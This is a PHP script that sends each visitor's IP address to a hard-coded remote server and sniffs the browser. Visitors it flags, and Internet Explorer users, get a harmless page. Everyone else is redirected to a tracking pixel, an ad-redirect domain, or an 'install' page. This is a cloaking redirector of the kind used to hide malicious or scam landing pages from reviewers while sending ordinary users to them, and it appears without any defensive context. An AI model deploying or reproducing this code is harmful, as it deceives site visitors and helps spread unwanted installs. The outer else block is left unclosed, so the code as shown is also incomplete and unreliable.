<?php
	$_SERVER['HTTP_USER_AGENT'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
	if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
		$_SERVER["REMOTE_ADDR"] = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	function tarayici() {
    $tespit2=$_SERVER['HTTP_USER_AGENT'];
    if(stristr($tespit2,"MSIE")) { $tarayici="Internet Explorer"; }
    elseif(stristr($tespit2, "Trident")) { $tarayici="Internet Explorer"; }
    elseif(stristr($tespit2, "Windows Phone")) { $tarayici="Internet Explorer"; }
    elseif(stristr($tespit2, "iPad")) { $tarayici="Internet Explorer"; }
    elseif(stristr($tespit2,"Firefox")) { $tarayici="Mozilla Firefox"; }
    elseif(stristr($tespit2,"YaBrowser")) { $tarayici="Yandex Browser"; }
    elseif(stristr($tespit2,"Chrome")) { $tarayici="Google Chrome"; }
    elseif(stristr($tespit2,"Safari")) { $tarayici="Safari"; }
    elseif(stristr($tespit2,"Opera")) { $tarayici="Opera"; }
    else {$tarayici="Bilinmiyor";}
    return $tarayici;
    }

function getIpAddress() {
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddresses = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim(end($ipAddresses));
    }
    else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$gelenip = getIpAddress();
$taray = tarayici(); 
    $url = 'http://185.181.210.254/index.php?adres=' . ($gelenip);
    $curl = curl_init () or die ('curl_init() failed');
    curl_setopt ($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt ($curl, CURLOPT_TIMEOUT, 5);
    curl_setopt ($curl, CURLOPT_URL, $url);
    $data = curl_exec ($curl);
    curl_close ($curl);
    $json = json_decode($data, true);
    $durum = $json["status"];
   if($durum === "1" || $taray == "Internet Explorer")   {

	include("share.php");

}else{ 
header('X-Frame-Options: DENY');
require_once 'Mobile_Detect.php';
$detect = new Mobile_Detect;
 
// Any mobile device (phones or tablets).
if ( $detect->isMobile() ) {
echo '<script> new Image().src = "http://notlifes.com/control.php?_=1501860431458"; setTimeout(function(){ location.href="http://redirect145.info/ad/5a0bb04c"; },500); </script>';
}else{
	echo '<!DOCTYPE html>
<html>
<head>
	<meta name="no-referrer" content="none">
	<meta http-equiv="refresh" content="0; url=http://ipcheck.marketingapis.com/install/">
</head>
<body>
</body>
</html>';
}
?>
